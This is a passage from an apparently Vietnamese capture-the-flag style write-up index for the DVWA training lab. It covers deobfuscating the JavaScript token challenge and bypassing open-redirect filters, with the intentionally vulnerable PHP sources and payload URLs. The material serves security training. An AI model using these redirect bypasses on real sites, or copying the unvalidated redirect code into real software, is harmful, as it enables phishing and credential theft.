j;f=b+v<<0;b=v+1f<<0;1a=((b>>>2)|(b<<30))^((b>>>13)|(b<<19))^((b>>>22)|(b<<10));1b=((f>>>6)|(f<<26))^((f>>>11)|(f<<21))^((f>>>25)|(f<<7));1D=b&c;1j=1D^(b&d)^1V;1h=(f&g)^(~f&h);v=e+1b+1h+K[j+3]+l[j+3];1f=1a+1j;e=a+v<<0;a=v+1f<<0}k.C=k.C+a<<0;k.B=k.B+b<<0;k.E=k.E+c<<0;k.F=k.F+d<<0;k.J=k.J+e<<0;k.I=k.I+f<<0;k.H=k.H+g<<0;k.D=k.D+h<<0};N.Q.1e=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x201e=m[(C>>28)&o]+m[(C>>24)&o]+m[(C>>20)&o]+m[(C>>16)&o]+m[(C>>12)&o]+m[(C>>8)&o]+m[(C>>4)&o]+m[C&o]+m[(B>>28)&o]+m[(B>>24)&o]+m[(B>>20)&o]+m[(B>>16)&o]+m[(B>>12)&o]+m[(B>>8)&o]+m[(B>>4)&o]+m[B&o]+m[(E>>28)&o]+m[(E>>24)&o]+m[(E>>20)&o]+m[(E>>16)&o]+m[(E>>12)&o]+m[(E>>8)&o]+m[(E>>4)&o]+m[E&o]+m[(F>>28)&o]+m[(F>>24)&o]+m[(F>>20)&o]+m[(F>>16)&o]+m[(F>>12)&o]+m[(F>>8)&o]+m[(F>>4)&o]+m[F&o]+m[(J>>28)&o]+m[(J>>24)&o]+m[(J>>20)&o]+m[(J>>16)&o]+m[(J>>12)&o]+m[(J>>8)&o]+m[(J>>4)&o]+m[J&o]+m[(I>>28)&o]+m[(I>>24)&o]+m[(I>>20)&o]+m[(I>>16)&o]+m[(I>>12)&o]+m[(I>>8)&o]+m[(I>>4)&o]+m[I&o]+m[(H>>28)&o]+m[(H>>24)&o]+m[(H>>20)&o]+m[(H>>16)&o]+m[(H>>12)&o]+m[(H>>8)&o]+m[(H>>4)&o]+m[H&o];p(!k.x){1e+=m[(D>>28)&o]+m[(D>>24)&o]+m[(D>>20)&o]+m[(D>>16)&o]+m[(D>>12)&o]+m[(D>>8)&o]+m[(D>>4)&o]+m[D&o]}A\\x201e};N.Q.2U=N.Q.1e;N.Q.1G=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x202b=[(C>>24)&u,(C>>16)&u,(C>>8)&u,C&u,(B>>24)&u,(B>>16)&u,(B>>8)&u,B&u,(E>>24)&u,(E>>16)&u,(E>>8)&u,E&u,(F>>24)&u,(F>>16)&u,(F>>8)&u,F&u,(J>>24)&u,(J>>16)&u,(J>>8)&u,J&u,(I>>24)&u,(I>>16)&u,(I>>8)&u,I&u,(H>>24)&u,(H>>16)&u,(H>>8)&u,H&u];p(!k.x){2b.4A((D>>24)&u,(D>>16)&u,(D>>8)&u,D&u)}A\\x202b};N.Q.27=N.Q.1G;N.Q.2R=w(){k.1s();q\\x201w=O\\x20Z(k.x?28:32);q\\x201i=O\\x204x(1w);1i.1p(0,k.C);1i.1p(4,k.B);1i.1p(8,k.E);1i.1p(12,k.F);1i.1p(16,k.J);1i.1p(20,k.I);1i.1p(24,k.H);p(!k.x){1i.1p(28,k.D)}A\\x201w};w\\x201P(G,x,1v){q\\x20i,T=1c\\x20G;p(T===\\x272p\\x27){q\\x20L=[],W=G.W,M=0,r;1g(i=0;i<W;++i){r=G.1Q(i);p(r<R){L[M++]=r}z\\x20p(r<2v){L[M++]=(2t|(r>>6));L[M++]=(R|(r&V))}z\\x20p(r<2A||r>=2E){L[M++]=(2D|(r>>12));L[M++]=(R|((r>>6)&V));L[M++]=(R|(r&V))}z{r=2C+(((r&23)<<10)|(G.1Q(++i)&23));L[M++]=(2X|(r>>18));L[M++]=(R|((r>>12)&V));L[M++]=(R|((r>>6)&V));L[M++]=(R|(r&V))}}G=L}z{p(T===\\x271n\\x27){p(G===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&&G.1J===Z){G=O\\x202r(G)}z\\x20p(!1z.1K(G)){p(!1y||!Z.1N(G)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}}p(G.W>1k){G=(O\\x20N(x,1d)).S(G).27()}q\\x201F=[],2e=[];1g(i=0;i<1k;++i){q\\x20b=G[i]||0;1F[i]=4z^b;2e[i]=4y^b}N.1I(k,x,1v);k.S(2e);k.1F=1F;k.2c=1d;k.1v=1v}1P.Q=O\\x20N();1P.Q.1s=w(){N.Q.1s.1I(k);p(k.2c){k.2c=1O;q\\x202W=k.27();N.1I(k,k.x,k.1v);k.S(k.1F);k.S(2W);N.Q.1s.1I(k)}};q\\x20X=2a();X.1q=X;X.1H=2a(1d);X.1q.2V=2f();X.1H.2V=2f(1d);p(2G){2g.X=X}z{Y.1q=X.1q;Y.1H=X.1H;p(2s){2l(w(){A\\x20X})}}})();w\\x202y(e){1g(q\\x20t=\\x22\\x22,n=e.W-1;n>=0;n--)t+=e[n];A\\x20t}w\\x202J(t,y=\\x224B\\x22){1m.1o(\\x221M\\x22).1r=1q(1m.1o(\\x221M\\x22).1r+y)}w\\x202B(e=\\x224E\\x22){1m.1o(\\x221M\\x22).1r=1q(e+1m.1o(\\x221M\\x22).1r)}w\\x202K(a,b){1m.1o(\\x221M\\x22).1r=2y(1m.1o(\\x222F\\x22).1r)}1m.1o(\\x222F\\x22).1r=\\x22\\x22;4u(w(){2B(\\x224M\\x22)},4N);1m.1o(\\x224P\\x22).4Q(\\x224R\\x22,2J);2K(\\x223O\\x22,44);' , '||||||||||||||||||||this|blocks|HEX_CHARS||0x0F|if|var|code|message||0xFF|t1|function|is224||else|return|h1|h0|h7|h2|h3|key|h6|h5|h4||bytes|index|Sha256|new|method|prototype|0x80|update|type|SHIFT|0x3f|length|exports|root|ArrayBuffer|||||||||||s0|s1|typeof|true|hex|t2|for|ch|dataView|maj|64|ERROR|document|object|getElementById|setUint32|sha256|value|finalize|Error|throw|sharedMemory|buffer|obj|ARRAY_BUFFER|Array|start|ab|block|bc|OUTPUT_TYPES|oKeyPad|digest|sha224|call|constructor|isArray|hashed|token|isView|false|HmacSha256|charCodeAt|WINDOW|crypto|create|finalized|cd|hash|outputType|Buffer|da||||0x3ff||||array|||createMethod|arr|inner|process|iKeyPad|createHmacMethod|module|notString|hBytes|first|createHmacOutputMethod|define|createOutputMethod|algorithm|NODE_JS|string|null|Uint8Array|AMD|0xc0|lastByteIndex|0x800|EXTRA|createHash|do_something|nodeMethod|0xd800|token_part_2|0x10000|0xe0|0xe000|phrase|COMMON_JS|4294967296|window|token_part_3|token_part_1|WEB_WORKER|self|require|eval|nodeWrap|versions|arrayBuffer|JS_SHA256_NO_NODE_JS|undefined|toString|hmac|innerHash|0xf0|0xa2bfe8a1|0xc24b8b70||0xa81a664b||0x92722c85|0x81c2c92e|0xc76c51a3|0x53380d13|0x766a0abb|0x4d2c6dfc|0x650a7354|0x748f82ee|0x84c87814|0x78a5636f|0x682e6ff3|0x8cc70208|0x2e1b2138|0xa4506ceb|0x90befffa|0xbef9a3f7|0x5b9cca4f|0x4ed8aa4a|0x106aa070|0xf40e3585|0xd6990624|0x19a4c116|0x1e376c08|0x391c0cb3|0x34b0bcb5|0x2748774c|0xd192e819|0x0fc19dc6|32768|128|8388608|2147483648|split|0x428a2f98|0x71374491|0x59f111f1|0x3956c25b|0xe9b5dba5|0xb5c0fbcf|0123456789abcdef|JS_SHA256_NO_ARRAY_BUFFER|is|invalid|input|strict|use|JS_SHA256_NO_WINDOW|ABCD|amd|JS_SHA256_NO_COMMON_JS|global|node|0x923f82a4|0xab1c5ed5|0x983e5152|0xa831c66d|0x76f988da|0x5cb0a9dc|0x4a7484aa|0xb00327c8|0xbf597fc7|0x14292967|0x06ca6351||0xd5a79147|0xc6e00bf3|0x2de92c6f|0x240ca1cc|0x550c7dc3|0x72be5d74|0x243185be|0x12835b01|0xd807aa98|0x80deb1fe|0x9bdc06a7|0xc67178f2|0xefbe4786|0xe49b69c1|0xc19bf174|0x27b70a85|0x3070dd17|300032|1413257819|150054599|24177077|56|4294967295|0x5be0cd19|while|setTimeout|704751109|210244248|DataView|0x36|0x5c|push|ZZ|Object|143694565|YY|0x1f83d9ab|1521486534|0x367cd507|0xc1059ed8|0xffc00b31|0x68581511|0x64f98fa7|XX|300|0x9b05688c|send|addEventListener|click|utf8|0xbefa4fa4|0xf70e5939|0x510e527f|0xbb67ae85|0x6a09e667|0x3c6ef372|0xa54ff53a|JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW' , 'split' ];( function ( c , d ){ var e = function ( f ){ while ( -- f ){ c [ 'push' ]( c [ 'shift' ]());}}; e ( ++ d );}( a , 0x1f4 )); var b = function ( c , d ){ c = c - 0x0 ; var e = a [ c ]; return e ;}; eval ( function ( d , e , f , g , h , i ){ h = function ( j ){ return ( j < e ? '' : h ( parseInt ( j / e ))) + (( j = j % e ) > 0x23 ? String [ b ( '0x0' )]( j + 0x1d ) : j [ b ( '0x1' )]( 0x24 ));}; if ( ! '' [ b ( '0x2' )]( /^/ , String )){ while ( f -- ){ i [ h ( f )] = g [ f ] || h ( f );} g = [ function ( k ){ if ( 'wpA' !== b ( '0x3' )){ return i [ k ];} else { while ( f -- ){ i [ k ( f )] = g [ f ] || k ( f );} g = [ function ( l ){ return i [ l ];}]; k = function (){ return b ( '0x4' );}; f = 0x1 ;}}]; h = function (){ return b ( '0x4' );}; f = 0x1 ;}; while ( f -- ){ if ( g [ f ]){ if ( b ( '0x5' ) === b ( '0x6' )){ return i [ h ];} else { d = d [ b ( '0x2' )]( new RegExp ( '\\x5cb' + h ( f ) + '\\x5cb' , 'g' ), g [ f ]);}}} return d ;}( b ( '0x7' ), 0x3e , 0x137 , b ( '0x8' )[ b ( '0x9' )]( '|' ), 0x0 ,{}));","title":"Security Level: High"},{"location":"dvwa/javascript/#analysis_2","text":"V\u1edbi b\u00e0i n\u00e0y, ta th\u1ea5y \u0111o\u1ea1n code javascript kh\u00e1 kh\u00f3 hi\u1ec3u. Th\u00ec th\u1ef1c ra \u0111o\u1ea1n m\u00e3 n\u00e0y \u0111\u00e3 b\u1ecb Obfuscation , v\u00e0 ta s\u1ebd d\u00f9ng deobfuscate javascript \u0111\u1ec3 xem code. function do_something ( e ) { for ( var t = \"\" , n = e . length - 1 ; n >= 0 ; n -- ) t += e [ n ]; return t } function token_part_3 ( t , y = \"ZZ\" ) { document . getElementById ( \"token\" ). value = sha256 ( document . getElementById ( \"token\" ). value + y ) } function token_part_2 ( e = \"YY\" ) { document . getElementById ( \"token\" ). value = sha256 ( e + document . getElementById ( \"token\" ). value ) } function token_part_1 ( a , b ) { document . getElementById ( \"token\" ). value = do_something ( document . getElementById ( \"phrase\" ). value ) } document . getElementById ( \"phrase\" ). value = \"\" ; setTimeout ( function () { token_part_2 ( \"XX\" ) }, 300 ); document . getElementById ( \"send\" ). addEventListener ( \"click\" , token_part_3 ); token_part_1 ( \"ABCD\" , 44 ); Ta l\u01b0\u1ee3m nh\u1eb7t \u0111\u01b0\u1ee3c c\u00e1c d\u00f2ng quan tr\u1ecdng n\u1eb1m cu\u1ed1i \u0111o\u1ea1n code. L\u00fac n\u00e0y ta s\u1ebd ph\u00e2n t\u00edch xem tr\u00ecnh t\u1ef1 th\u1ef1c thi c\u1ee7a c\u00e1c h\u00e0m. Ta th\u1ea5y t\u1ed5ng c\u1ed9ng c\u00f3 3 h\u00e0m: token_part_1 - A token_part_2 - B token_part_3 - C C\u00e1i v\u1ea5n \u0111\u1ec1 nan gi\u1ea3i \u1edf \u0111\u00e2y l\u00e0 h\u00e0m setTimeout delay token_part_2() 300s, th\u00ec cho ta kh\u00f4ng bi\u1ebft \u0111\u01b0\u1ee3c th\u1ee9 t\u1ef1 ch\u00ednh x\u00e1c c\u1ee7a 3 h\u00e0m A, B, C ch\u1ea1y nh\u01b0 th\u1ebf n\u00e0o. Hi\u1ec3n nhi\u00ean khi test v\u1edbi console.log(\"A\"), console.log(\"B\"), console.log(\"C\") th\u00ec ta s\u1ebd th\u1ea5y \u0111\u01b0\u1ee3c th\u1ee9 t\u1ef1 g\u1ecdi l\u00e0 C - A - B. Nh\u01b0ng \u0111\u00e2y h\u1ecd d\u00f9ng SHA256 th\u00ec c\u00f3 th\u1ec3 th\u1eddi gian n\u00f3 ch\u00eanh l\u1ec7ch v\u00e0 d\u1eabn \u0111\u1ebfn th\u1ee9 t\u1ef1 g\u1ecdi c\u00e1c h\u00e0m kh\u00f4ng c\u00f2n \u0111\u00fang n\u1eefa. Well, sau m\u1ed9t v\u00e0i thao t\u00e1c th\u1eed, ta c\u00f3 th\u1ec3 th\u1ea5y \u0111\u01b0\u1ee3c th\u1ee9 t\u1ef1 g\u1ecdi \u0111\u00fang l\u00e0 C - A - B v\u00e0 token c\u1ea7n t\u00ecm l\u00e0 7f1bfaaf829f785ba5801d5bf68c1ecaf95ce04545462c8b8f311dfc9014068a \u0111\u01b0\u1ee3c l\u1ea5y t\u1eeb SHA256(XXsseccus)","title":"Analysis"},{"location":"dvwa/javascript/#exploition_2","text":"Khai th\u00e1c nh\u01b0 2 challenge tr\u01b0\u1edbc. H\u00e3y xem m\u1ed9t ph\u1ea7n chatGPT ph\u00e2n t\u00edch cho \u0111o\u1ea1n m\u00e3 javascript Sau khi g\u1ecdi token_part_3. Ngay l\u1eadp t\u1ee9c th\u1ef1c thi token_part_1 v\u00e0 c\u00f3 th\u1ec3 g\u1ea7n h\u1ebft 300s (l\u00e0 th\u1eddi \u0111i\u1ec3m token_part_2 \u0111\u01b0\u1ee3c g\u1ecdi). V\u00e0 token c\u1ea7n t\u00ecm l\u00e0 SHA256(XX + do_something(\"success\"))","title":"Exploition"},{"location":"dvwa/javascript/#security-level-impossible","text":"You can never trust anything that comes from the user or prevent them from messing with it and so there is no impossible level.","title":"Security Level: Impossible"},{"location":"dvwa/javascript/#spoiler","text":"","title":"Spoiler"},{"location":"dvwa/javascript/#low-level","text":"All the JavaScript is included in the page. Read the source and work out what function is being used to generate the token required to match with the phrase and then call the function manually. Spoiler: Change the phrase to success and then use the function generate_token() to update the token.","title":"Low Level"},{"location":"dvwa/javascript/#medium-level","text":"The JavaScript has been broken out into its own file and then minimized. You need to view the source for the included file and then work out what it is doing. Both Firefox and Chrome have a Pretty Print feature which attempts to reverse the compression and display code in a readable way. Spoiler: The file uses the setTimeout function to run the do_elsesomething function which generates the token.","title":"Medium Level"},{"location":"dvwa/javascript/#high-level","text":"The JavaScript has been obfuscated by at least one engine. You are going to need to step through the code to work out what is useful, what is garbage and what is needed to complete the mission. Spoiler: If it helps, two packers have been used, the first is from Dan's Tools and the second is the JavaScript Obfuscator Tool . Spoiler 2: This deobfuscation tool seems to work the best on this code deobfuscate javascript . Spoiler 3: This is one way to do it... run the obfuscated JS through a deobfuscation app, intercept the response for the obfuscated JS and swap in the readable version. Work out the flow and you will see three functions that need to be called in order. Call the functions at the right time with the right parameters.","title":"High Level"},{"location":"dvwa/javascript/#impossible-level","text":"You can never trust the user and have to assume that any code sent to the user can be manipulated or bypassed and so there is no impossible level.","title":"Impossible Level"},{"location":"dvwa/javascript/#more-information","text":"https://www.w3schools.com/js/ https://www.youtube.com/watch?v=cs7EQdWO5o0&index=17&list=WL https://ponyfoo.com/articles/es6-proxies-in-depth","title":"More Information"},{"location":"dvwa/open-http-redirect/","tags":["DVWA","Open HTTP Redirect"],"text":"Open HTTP Redirect \u00b6 About \u00b6 OWASP define this as: Unvalidated redirects and forwards are possible when a web application accepts untrusted input that could cause the web application to redirect the request to a URL contained within untrusted input. By modifying untrusted URL input to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials. As suggested above, a common use for this is to create a URL which initially goes to the real site but then redirects the victim off to a site controlled by the attacker. This site could be a clone of the target's login page to steal credentials, a request for credit card details to pay for a service on the target site, or simply a spam page full of advertising. Objective \u00b6 Abuse the redirect page to move the user off the DVWA site or onto a different page on the site than expected. Ta s\u1ebd d\u00f9ng trang https://google.com \u0111\u1ec3 l\u00e0m target c\u1ee7a vi\u1ec7c chuy\u1ec3n h\u01b0\u1edbng. Security Level: Low \u00b6 Source code vulnerabilities/open_redirect/source/low.php <?php if ( array_key_exists ( \"redirect\" , $_GET ) && $_GET [ 'redirect' ] != \"\" ) { header ( \"location: \" . $_GET [ 'redirect' ]); exit ; } http_response_code ( 500 ); ?> <p>Missing redirect target.</p> <?php exit ; ?> Analysis \u00b6 Nh\u1eadn th\u1ea5y r\u1eb1ng, challenge cung c\u1ea5p cho ta link c\u1ee7a 2 Quote: Quote 1: http://localhost:4280/vulnerabilities/open_redirect/source/low.php?redirect=info.php?id=1 Quote 2: http://localhost:4280/vulnerabilities/open_redirect/source/low.php?redirect=info.php?id=2 Tham s\u1ed1 ch\u00ednh c\u1ee7a url l\u00e0 redirect . V\u00e0 trong \u0111o\u1ea1n code c\u1ee7a challenge ch\u1ec9 \u0111\u1ec1 c\u1eadp \u0111\u1ebfn vi\u1ec7c ki\u1ec3m tra xem n\u1ebfu t\u1ed3n t\u1ea1i gi\u00e1 tr\u1ecb c\u1ee7a redirect th\u00ec th\u1ef1c thi. Do \u0111\u00f3 ta c\u00f3 th\u1ec3 ti\u00eam gi\u00e1 tr\u1ecb https://google.com v\u00e0o tham s\u1ed1 redirect \u0111\u1ec3 ti\u1ebfn h\u00e0nh chuy\u1ec3n h\u01b0\u1edbng qua trang google.com. Exploition \u00b6 Nh\u01b0 \u0111\u00e3 ph\u00e2n t\u00edch \u1edf tr\u00ean, payload \u0111\u1ea7y \u0111\u1ee7 c\u1ee7a ch\u00fang ta l\u00e0 http://localhost:4280/vulnerabilities/open_redirect/source/low.php?redirect=https://google.com Security Level: Medium \u00b6 Source code vulnerabilities/open_redirect/source/medium.php <?php if ( array_key_exists ( \"redirect\" , $_GET ) && $_GET [ 'redirect' ] != \"\" ) { if ( preg_match ( \"/http:\\/\\/|https:\\/\\//i\" , $_GET [ 'redirect' ])) { http_response_code ( 500 ); ?> <p>Absolute URLs not allowed.</p> <?php exit ; } else { header ( \"location: \" . $_GET [ 'redirect' ]); exit ; } } http_response_code ( 500 ); ?> <p>Missing redirect target.</p> <?php exit ; ?> Analysis \u00b6 \u1ede challenge n\u00e0y, h\u1ecd filter \u0111\u1ea7u v\u00e0o b\u1eb1ng vi\u1ec7c ch\u1eb7n s\u1ef1 xu\u1ea5t hi\u1ec7n c\u1ee7a http:// v\u00e0 https:// Exploition \u00b6 B\u00e0i n\u00e0y ta d\u00f9ng protocol-relative URL (PRURL) \u0111\u1ec3 bypass v\u00e0 payload \u0111\u1ea7y \u0111\u1ee7 nh\u01b0 d\u01b0\u1edbi \u0111\u00e2y Payload: http://localhost:4280/vulnerabilities/open_redirect/source/medium.php?redirect=//google.com Security Level: High \u00b6 Source code vulnerabilities/open_redirect/source/high.php <?php if ( array_key_exists ( \"redirect\" , $_GET ) && $_GET [ 'redirect' ] != \"\" ) { if ( strpos ( $_GET [ 'redirect' ], \"info.php\" ) !== false ) { header ( \"location: \" . $_GET [ 'redirect' ]); exit ; } else { http_response_code ( 500 ); ?> <p>You can only redirect to the info page.</p> <?php exit ; } } http_response_code ( 500 ); ?> <p>Missing redirect target.</p> <?php exit ; ?> Analysis \u00b6 B\u00e0i n\u00e0y h\u1ecd d\u00f9ng h\u00e0m strpos() \u0111\u1ec3 ki\u1ec3m tra xem chu\u1ed7i info.php c\u00f3 xu\u1ea5t hi\u1ec7n trong chu\u1ed7i \u0111\u01b0\u1ee3c truy\u1ec1n v\u00e0o tham s\u1ed1 redirect hay kh\u00f4ng. N\u1ebfu kh\u00f4ng th\u00ec s\u1ebd g\u1eedi th\u00f4ng b\u00e1o You can only redirect to the info page. v\u00e0 s\u1ebd kh\u00f4ng th\u00e0nh c\u00f4ng trong vi\u1ec7c redirect. B\u1ea1n c\u00f3 th\u1ec3 d\u1ec5 d\u00e0ng nh\u1eadn th\u1ea5y th\u00f4ng qua URL d\u1eabn \u0111\u1ebfn Quote 1 ho\u1eb7c URL d\u1eabn \u0111\u1ebfn Quote 2. http://localhost:4280/vulnerabilities/open_redirect/source/low.php?redirect=info.php?id=1 \u0110\u1ec3 \u00fd r\u1eb1ng, chu\u1ed7i info.php&id=1 \u0111\u01b0\u1ee3c truy\u1ec1n v\u00e0o tham s\u1ed1 redirect \u0111\u00e3 v\u00f4 t\u00ecnh bi\u1ebfn cho chu\u1ed7i 1 l\u00e0m gi\u00e1 tr\u1ecb cho tham s\u1ed1 id . T\u00f3m l\u1ea1i ta c\u1ea7n redirect t\u1edbi 1 website n\u00e0o \u0111\u00f3 \u0111\u1ee7 \"m\u1ea1nh\" \u0111\u1ec3 n\u00f3 c\u00f3 th\u1ec3 filter nh\u1eefng tham s\u1ed1 l\u1ed7i. Nh\u01b0 payload d\u01b0\u1edbi \u0111\u00e2y. http://localhost:4280/vulnerabilities/open_redirect/source/high.php?redirect=https://google.com?info.php Security Level: Impossible \u00b6 Source code vulnerabilities/open_redirect/source/impossible.php <?php $target = \"\" ; if ( array_key_exists ( \"redirect\" , $_GET ) && is_numeric ( $_GET [ 'redirect' ])) { switch ( intval ( $_GET [ 'redirect' ])) { case 1 : $target = \"info.php?id=1\" ; break ; case 2 : $target = \"info.php?id=2\" ; break ; case 99 : $target = \"https://digi.ninja\" ; break ; } if ( $target != \"\" ) { header ( \"location: \" . $target ); exit ; } else { ?> Unknown redirect target. <?php exit ; } } ?> Missing redirect target. What we learned \u00b6 PRURL: https://en.wikipedia.org/wiki/URL#prurl Spoiler \u00b6 Low Level \u00b6 The redirect page has no limitations, you can redirect to anywhere you want. Spoiler: Try browsing to /vulnerabilities/open_redirect/source/low.php?redirect= https://digi.ninja Medium Level \u00b6 The code prevents you from using absolute URLs to take the user off the site, so you can either use relative URLs to take them to other pages on the same site or a Protocol-relative URL. Spoiler: Try browsing to /vulnerabilities/open_redirect/source/low.php?redirect=//digi.ninja High Level \u00b6 The redirect page tries to lock you to only redirect to the info.php page, but does this by checking that the URL contains \"info.php\". Spoiler: Try browsing to /vulnerabilities/open_redirect/source/low.php?redirect= https://digi.ninja/?a=info.php Impossible Level \u00b6 Rather than accepting a page or URL as the redirect target, the system uses ID values to tell the redirect page where to redirect to. This ties the system down to only redirect to pages it knows about and so there is no way for an attacker to modify things to go to a page of their choosing. More Information \u00b6 OWASP Unvalidated Redirects and Forwards Cheat Sheet WSTG - Testing for Client-side URL Redirect Mitre - CWE-601: URL Redirection to Untrusted Site ('Open Redirect') https://en.wikipedia.org/wiki/Password_cracking","title":"Open HTTP Redirect"},{"location":"dvwa/open-http-redirect/#open-http-redirect","text":"","title":"Open HTTP Redirect"},{"location":"dvwa/open-http-redirect/#about","text":"OWASP define this as: Unvalidated redirects and forwards are possible when a web application accepts untrusted input that could cause the web application to redirect the request to a URL contained within untrusted input. By modifying untrusted URL input to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials. As suggested above, a common use for this is to create a URL which initially goes to the real site but then redirects the victim off to a site controlled by the attacker. This site could be a clone of the target's login page to steal credentials, a request for credit card details to pay for a service on the target site, or simply a spam page full of advertising.","title":"About"},{"location":"dvwa/open-http-redirect/#objective","text":"Abuse the redirect page to move the user off the DVWA site or onto a different page on the site than expected. Ta s\u1ebd d\u00f9ng trang https://google.com \u0111\u1ec3 l\u00e0m target c\u1ee7a vi\u1ec7c chuy\u1ec3n h\u01b0\u1edbng.","title":"Objective"},{"location":"dvwa/open-http-redirect/#security-level-low","text":"Source code vulnerabilities/open_redirect/source/low.php <?php if ( array_key_exists ( \"redirect\" , $_GET ) && $_GET [ 'redirect' ] != \"\" ) { header ( \"location: \" . $_GET [ 'redirect' ]); exit ; } http_response_code ( 500 ); ?> <p>Missing redirect target.</p> <?php exit ; ?>","title":"Security Level: Low"},{"location":"dvwa/open-http-redirect/#analysis","text":"Nh\u1eadn th\u1ea5y r\u1eb1ng, challenge cung c\u1ea5p cho ta link c\u1ee7a 2 Quote: Quote 1: http://localhost:4280/vulnerabilities/open_redirect/source/low.php?redirect=info.php?id=1 Quote 2: http://localhost:4280/vulnerabilities/open_redirect/source/low.php?redirect=info.php?id=2 Tham s\u1ed1 ch\u00ednh c\u1ee7a url l\u00e0 redirect . V\u00e0 trong \u0111o\u1ea1n code c\u1ee7a challenge ch\u1ec9 \u0111\u1ec1 c\u1eadp \u0111\u1ebfn vi\u1ec7c ki\u1ec3m tra xem n\u1ebfu t\u1ed3n t\u1ea1i gi\u00e1 tr\u1ecb c\u1ee7a redirect th\u00ec th\u1ef1c thi. Do \u0111\u00f3 ta c\u00f3 th\u1ec3 ti\u00eam gi\u00e1 tr\u1ecb https://google.com v\u00e0o tham s\u1ed1 redirect \u0111\u1ec3 ti\u1ebfn h\u00e0nh chuy\u1ec3n h\u01b0\u1edbng qua trang google.com.","title":"Analysis"},{"location":"dvwa/open-http-redirect/#exploition","text":"Nh\u01b0 \u0111\u00e3 ph\u00e2n t\u00edch \u1edf tr\u00ean, payload \u0111\u1ea7y \u0111\u1ee7 c\u1ee7a ch\u00fang ta l\u00e0 http://localhost:4280/vulnerabilities/open_redirect/source/low.php?redirect=https://google.com","title":"Exploition"},{"location":"dvwa/open-http-redirect/#security-level-medium","text":"Source code vulnerabilities/open_redirect/source/medium.php <?php if ( array_key_exists ( \"redirect\" , $_GET ) && $_GET [ 'redirect' ] != \"\" ) { if ( preg_match ( \"/http:\\/\\/|https:\\/\\//i\" , $_GET [ 'redirect' ])) { http_response_code ( 500 ); ?> <p>Absolute URLs not allowed.</p> <?php exit ; } else { header ( \"location: \" . $_GET [ 'redirect' ]); exit ; } } http_response_code ( 500 ); ?> <p>Missing redirect target.</p> <?php exit ; ?>","title":"Security Level: Medium"},{"location":"dvwa/open-http-redirect/#analysis_1","text":"\u1ede challenge n\u00e0y, h\u1ecd filter \u0111\u1ea7u v\u00e0o b\u1eb1ng vi\u1ec7c ch\u1eb7n s\u1ef1 xu\u1ea5t hi\u1ec7n c\u1ee7a http:// v\u00e0 https://","title":"Analysis"},{"location":"dvwa/open-http-redirect/#exploition_1","text":"B\u00e0i n\u00e0y ta d\u00f9ng protocol-relative URL (PRURL) \u0111\u1ec3 bypass v\u00e0 payload \u0111\u1ea7y \u0111\u1ee7 nh\u01b0 d\u01b0\u1edbi \u0111\u00e2y Payload: http://localhost:4280/vulnerabilities/open_redirect/source/medium.php?redirect=//google.com","title":"Exploition"},{"location":"dvwa/open-http-redirect/#security-level-high","text":"Source code vulnerabilities/open_redirect/source/high.php <?php if ( array_key_exists ( \"redirect\" , $_GET ) && $_GET [ 'redirect' ] != \"\" ) { if ( strpos ( $_GET [ 'redirect' ], \"info.php\" ) !== false ) { header ( \"location: \" . $_GET [ 'redirect' ]); exit ; } else { http_response_code ( 500 ); ?> <p>You can only redirect to the info page.</p> <?php exit ; } } http_response_code ( 500 ); ?> <p>Missing redirect target.</p> <?php exit ; ?>","title":"Security Level: High"},{"location":"dvwa/open-http-redirect/#analysis_2","text":"B\u00e0i n\u00e0y h\u1ecd d\u00f9ng h\u00e0m strpos() \u0111\u1ec3 ki\u1ec3m tra xem chu\u1ed7i info.php c\u00f3 xu\u1ea5t hi\u1ec7n trong chu\u1ed7i \u0111\u01b0\u1ee3c truy\u1ec1n v\u00e0o tham s\u1ed1 redirect hay kh\u00f4ng. N\u1ebfu kh\u00f4ng th\u00ec s\u1ebd g\u1eedi th\u00f4ng b\u00e1o You can only redirect to the info page. v\u00e0 s\u1ebd kh\u00f4ng th\u00e0nh c\u00f4ng trong vi\u1ec7c redirect. B\u1ea1n c\u00f3 th\u1ec3 d\u1ec5 d\u00e0ng nh\u1eadn th\u1ea5y th\u00f4ng qua URL d\u1eabn \u0111\u1ebfn Quote 1 ho\u1eb7c URL d\u1eabn \u0111\u1ebfn Quote 2. http://localhost:4280/vulnerabilities/open_redirect/source/low.php?redirect=info.php?id=1 \u0110\u1ec3 \u00fd r\u1eb1ng, chu\u1ed7i info.php&id=1 \u0111\u01b0\u1ee3c truy\u1ec1n v\u00e0o tham s\u1ed1 redirect \u0111\u00e3 v\u00f4 t\u00ecnh bi\u1ebfn cho chu\u1ed7i 1 l\u00e0m gi\u00e1 tr\u1ecb cho tham s\u1ed1 id . T\u00f3m l\u1ea1i ta c\u1ea7n redirect t\u1edbi 1 website n\u00e0o \u0111\u00f3 \u0111\u1ee7 \"m\u1ea1nh\" \u0111\u1ec3 n\u00f3 c\u00f3 th\u1ec3 filter nh\u1eefng tham s\u1ed1 l\u1ed7i. Nh\u01b0 payload d\u01b0\u1edbi \u0111\u00e2y. http://localhost:4280/vulnerabilities/open_redirect/source/high.php?redirect=https://google.com?info.php","title":"Analysis"},{"location":"dvwa/open-http-redirect/#security-level-impossible","text":"Source code vulnerabilities/open_redirect/source/impossible.php <?php $target = \"\" ; if ( array_key_exists ( \"redirect\" , $_GET ) && is_numeric ( $_GET [ 'redirect' ])) { switch ( intval ( $_GET [ 'redirect' ])) { case 1 : $target = \"info.php?id=1\" ; break ; case 2 : $target = \"info.php?id=2\" ; break ; case 99 : $target = \"https://digi.ninja\" ; break ; } if ( $target != \"\" ) { header ( \"location: \" . $target ); exit ; } else { ?> Unknown redirect target. <?php exit ; } } ?> Missing redirect target.","title":"Security Level: Impossible"},{"location":"dvwa/open-http-redirect/#what-we-learned","text":"PRURL: https://en.wikipedia.org/wiki/URL#prurl","title":"What we learned"},{"location":"dvwa/open-http-redirect/#spoiler","text":"","title":"Spoiler"},{"location":"dvwa/open-http-redirect/#low-level","text":"The redirect page has no limitations, you can redirect to anywhere you want. Spoiler: Try browsing to /vulnerabilities/open_redirect/source/low.php?redirect= https://digi.ninja","title":"Low 